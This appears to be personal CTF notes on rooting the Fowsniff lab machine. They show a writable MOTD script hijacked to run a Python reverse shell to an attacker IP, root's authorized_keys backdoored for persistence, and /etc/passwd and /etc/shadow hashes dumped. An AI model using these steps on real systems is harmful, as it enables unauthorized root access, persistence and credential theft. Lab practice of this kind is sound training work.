### New Usable SSH Pub Keys

> add to ~/.ssh/authorized_keys


User
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCf5X4g2GN6sny5QWt/olwDTUQjy8i7eBZFYm0q6gdWhIPB7DkB48qhqU0cxU2g8V/FW5JPpc4yH2J26u+kSc7Df1OHQ4WzaSBfV7/lG8UFIknIq9NYJ0qcRxgMCnH5PQwaokohZXGstr+UCUSuFY7EAfoMlefhyvEZU5B8NrlsEt1GiMf8td7MkpKQ5t/ZZGAqXCEnhddJRjktY0kAuoZQnRnvVip15v4Tw8c/GnV1gV827413VHPP7rtg7bNimh+QLCVTksTulVKFGs0JtsyAVYcojeLEs6rM0WyPqHx7mF78+ytHTKrerWnfR6y9tsCSWwHQUGxRD+qUH+tBe1tpqramyaqaP+NbSMHlRrqE9BuoN6UWSg2ObD6YdPk939+uBIC8ZU1xCEPp2FaOIe/izOyYy2F6MkxIPkB8dx1Lym/qqozMTEQ+iSnN42sTeRjNIQfxMkevUAnKccBxfavk0K4TpkdNAU2o5H1ChqeK/4BL57eM73oceUI7UGRsMYrG1KJ7fUdcr4ueGkqEacLPK2EW/ESwfyX4wDk3XPOrq0mD2jTNP5MvCXtortuFrSNXfd2M/HXOE41qUmJdTY2kYsiKt6yKeQ2lpHyethcORLkj0IYD+7ywemEJR3497r32ALEqrfla8IPogMAleHON25ueaXuWluKr6aAci8vukw== your_email@example.com

```

Root
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCfgZSq+4ohRXJ1046kRzC3K6jmBFtO+0TvCb0nqlDH1xTxIiEawKHXQMz5S8b1RlImbywkBiZUUUaaZ/gUrRKaEacKGZl340uLKrnwf4xFRtWj0mEWAoHgAmxMBX4RwKzHV3AeihbXGjw3iFl0eyR3/uWqPHnOI1UupMqGjXnmgmZznWGiGu6bRpV5fI7wrSbJpNGmtQNCK6Iu8ebzcJU20gKJri9Lww1uVFIUzPzcBZDNmmvHhtWOulvBVSreiGz7xzPXcyoVDfAfyn+i5Z+oHoVVgGINbm4TJ39HD2oDo2ySs6x0qTFfN0CKdh/2nP2ZlfnCNEOzJ+3zUDAILv9LgBSBZUcutyeVyVgHfi+It7ysm1x/wjS8QOW7FYbctJYs6FILM4WFYN9TutfA2oz5kg3vMr9iJkrZBoPzOKkRyYIQL1ZXKdVfrcOCsZf52c+WchQO9iWnJJXjWVeB8sqWModJK/pqlwWV/N7pbOin8s/XBemVvkRy/xJFZefG7AGQIjDKOmXqWwnmhm5nH8bcbfssQM9bE00lwL/Z4FaLin9ht61hQL7MdB7c2WPYOMkc8YEvcn0BylG0viwl/MXT1Uvnn84bwprx4KHf15/GQm1I+nRlxPUtyGks+x26Gy20QMyLZY12qgHvfbvcDDNpT20EZbMCRj01+xHOPBFP1Q== your_email@example.com

```


/home/baksteen/term.txt

```
I wonder if the person who coined the term "One Hit Wonder" 
came up with another other phrases.
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
postfix:x:108:115::/var/spool/postfix:/bin/false
dovecot:x:109:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:110:118:Dovecot login user,,,:/nonexistent:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
stone:x:1000:1000:stone,,,:/home/stone:/bin/bash
parede:x:1001:100::/home/parede:/bin/bash
mauer:x:1002:100::/home/mauer:/bin/bash
sciana:x:1003:100::/home/sciana:/bin/bash
baksteen:x:1004:100::/home/baksteen:/bin/bash
mursten:x:1005:100::/home/mursten:/bin/bash
tegel:x:1006:100::/home/tegel:/bin/bash
seina:x:1007:100::/home/seina:/bin/bash
mustikka:x:1008:100::/home/mustikka:/bin/bash
```

```
╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(stone) gid=1000(stone) groups=1000(stone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),119(lpadmin),120(sambashare)

uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)




╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group users:
/opt/cube/cube.sh

```

```
cat cube.sh
``` 

```
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"
```

can edit - might be able to execute a reverse 

```
/etc/update-motd.d/00-header
```

```
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#[ -r /etc/lsb-release ] && . /etc/lsb-release

#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
#	# Fall back to using the very slow lsb_release utility
#	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
#fi

#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

sh /opt/cube/cube.sh
```

this file runs as root when a user connects to the machine using ssh

https://www.revshells.com/

```
nc -lvnp 1337
```

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.18.190",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

nano cube.sh

remove content and insert reverse shell

start the listener

```
ssh -i baksteen_rsa_persis baksteen@10.10.191.213
```

```
listening on [any] 1337 ...
connect to [10.6.18.190] from (UNKNOWN) [10.10.191.213] 47866
# whoami
whoami
root
# sudo -l
sudo -l
Matching Defaults entries for root on fowsniff:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on fowsniff:
    (ALL : ALL) ALL
# uname -a
uname -a
Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
# 

```

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCfgZSq+4ohRXJ1046kRzC3K6jmBFtO+0TvCb0nqlDH1xTxIiEawKHXQMz5S8b1RlImbywkBiZUUUaaZ/gUrRKaEacKGZl340uLKrnwf4xFRtWj0mEWAoHgAmxMBX4RwKzHV3AeihbXGjw3iFl0eyR3/uWqPHnOI1UupMqGjXnmgmZznWGiGu6bRpV5fI7wrSbJpNGmtQNCK6Iu8ebzcJU20gKJri9Lww1uVFIUzPzcBZDNmmvHhtWOulvBVSreiGz7xzPXcyoVDfAfyn+i5Z+oHoVVgGINbm4TJ39HD2oDo2ySs6x0qTFfN0CKdh/2nP2ZlfnCNEOzJ+3zUDAILv9LgBSBZUcutyeVyVgHfi+It7ysm1x/wjS8QOW7FYbctJYs6FILM4WFYN9TutfA2oz5kg3vMr9iJkrZBoPzOKkRyYIQL1ZXKdVfrcOCsZf52c+WchQO9iWnJJXjWVeB8sqWModJK/pqlwWV/N7pbOin8s/XBemVvkRy/xJFZefG7AGQIjDKOmXqWwnmhm5nH8bcbfssQM9bE00lwL/Z4FaLin9ht61hQL7MdB7c2WPYOMkc8YEvcn0BylG0viwl/MXT1Uvnn84bwprx4KHf15/GQm1I+nRlxPUtyGks+x26Gy20QMyLZY12qgHvfbvcDDNpT20EZbMCRj01+xHOPBFP1Q== your_email@example.com " >> /root/.ssh/authorized_keys
```

```
ssh -i root_rsa_persis root@10.10.191.213

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Dec 31 19:00:10 1969
root@fowsniff:~# whoami
root
root@fowsniff:~# sudo -l
Matching Defaults entries for root on fowsniff:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on fowsniff:
    (ALL : ALL) ALL
root@fowsniff:~# uname -a
Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
root@fowsniff:~# 
```

/etc/shadow

```
root:!:17599:0:99999:7:::
daemon:*:17599:0:99999:7:::
bin:*:17599:0:99999:7:::
sys:*:17599:0:99999:7:::
sync:*:17599:0:99999:7:::
games:*:17599:0:99999:7:::
man:*:17599:0:99999:7:::
lp:*:17599:0:99999:7:::
mail:*:17599:0:99999:7:::
news:*:17599:0:99999:7:::
uucp:*:17599:0:99999:7:::
proxy:*:17599:0:99999:7:::
www-data:*:17599:0:99999:7:::
backup:*:17599:0:99999:7:::
list:*:17599:0:99999:7:::
irc:*:17599:0:99999:7:::
gnats:*:17599:0:99999:7:::
nobody:*:17599:0:99999:7:::
systemd-timesync:*:17599:0:99999:7:::
systemd-network:*:17599:0:99999:7:::
systemd-resolve:*:17599:0:99999:7:::
systemd-bus-proxy:*:17599:0:99999:7:::
syslog:*:17599:0:99999:7:::
_apt:*:17599:0:99999:7:::
messagebus:*:17599:0:99999:7:::
uuidd:*:17599:0:99999:7:::
postfix:*:17599:0:99999:7:::
dovecot:*:17599:0:99999:7:::
dovenull:*:17599:0:99999:7:::
sshd:*:17599:0:99999:7:::
stone:$6$ZqwLmndIR6qU/tlM$7XJ3dgO8oZEn1E660b.wCzIMgckjuiGfZookllpHR0hF4gwvZKMx1EFdop7EEYQKb/vp2nDCHWtiI/AKsOipf0:17599:0:99999:7:::
parede:$6$4NrmVKhIshBwUKlP$.IWJgjBi3632kwarmPY/8471zjGtzwG6/c3y6nVAnucrO0Q16zgzi3AKhqNtB/ibjrumKZQeGfGyAlYyAt52z/:17599:0:99999:7:::
mauer:$6$KLSaMNK.HGvomEm.$SZDQMudWshlWVkmdjTzaJCC7RWGhDWB6hCerqFNa8V/CEFlz.nqHsjJsVOTxH82uXH3WLnHynxg/.RsQZX5Ff.:17599:0:99999:7:::
sciana:$6$e55ofVQ6bRmCJlSD$oIkxRih2ZtgAlcsWQQegBprvd0cZzAviF4bBDpVP1JtOG4z.dxCED8gDdhx4P19JyzjI3WviR/IG.aj/M82o10:17599:0:99999:7:::
baksteen:$6$bIo9CngbzkgWaPH1$EVbxyUTrMjMVL85998hxMafLyXqvbNqSnFUx2a.B.GcyV4f0GBsEfUYjxciSZaKI5KPgH0ayY9VhbGHl1rbye1:17599:0:99999:7:::
mursten:$6$oc9lFfcr/NXCLJih$4IAE/SCPjGL1dYdxIFp0Pu21L0UGfRYyXXy500zbNNxmWZ.I8IAMOvr0sZt7iasxMMlq0nohjy4oCtP51B4k8/:17599:0:99999:7:::
tegel:$6$GI4IXaSf3SFiJ7H6$1KSGYui7ZRR.IIW0.nUin9m3Umh/qeOELfiphxMn.bpky5Docmjs2UEg9h2GaqpNdr0uizMaDNhy/A7NnjmHY/:17599:0:99999:7:::
seina:$6$.RXMM6MCm5BsTW8h$eoh0UgmvH.Bri51YLo7q4a273Mrjn.tHhKocHJTDcZtRhhv.ULzZpUbWGnM5E5ELPFhRex00rZ.MqCG1XSL6c.:17599:0:99999:7:::
mustikka:$6$b8arGcXk5Efqw/IX$YEyI.Cch1N3QBQtriJ86qXWaP36XSed7ujgM.cEPdwqZaRjXGmsaleey42XK0wRB2WcQqXBAOIOVK3yCyWNXN.:17599:0:99999:7:::
```

flag.txt
```
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```
